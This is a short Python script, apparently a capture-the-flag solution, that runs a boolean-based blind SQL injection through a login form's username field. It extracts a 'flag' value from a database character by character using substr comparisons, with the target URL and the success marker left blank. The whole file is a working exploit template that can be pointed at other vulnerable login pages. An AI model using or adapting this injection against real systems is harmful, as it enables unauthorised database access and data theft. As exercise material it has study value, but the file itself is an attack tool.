import requests
import string

str1='123456789'+string.ascii_letters+string.punctuation
flag=''
url=""
for j in range(1,50):
    for i in str1:
        paylaod = "0' or (if(substr((select flag from web.flag),{},1)='{}',1,0))#".format(j, i)
        data={
            'username':paylaod,
            'password':'admin'
        }
        r=requests.post(url,data=data)
        if '' in r.text:#查找到要找的字符串
            flag+=i
            print(flag)
            break
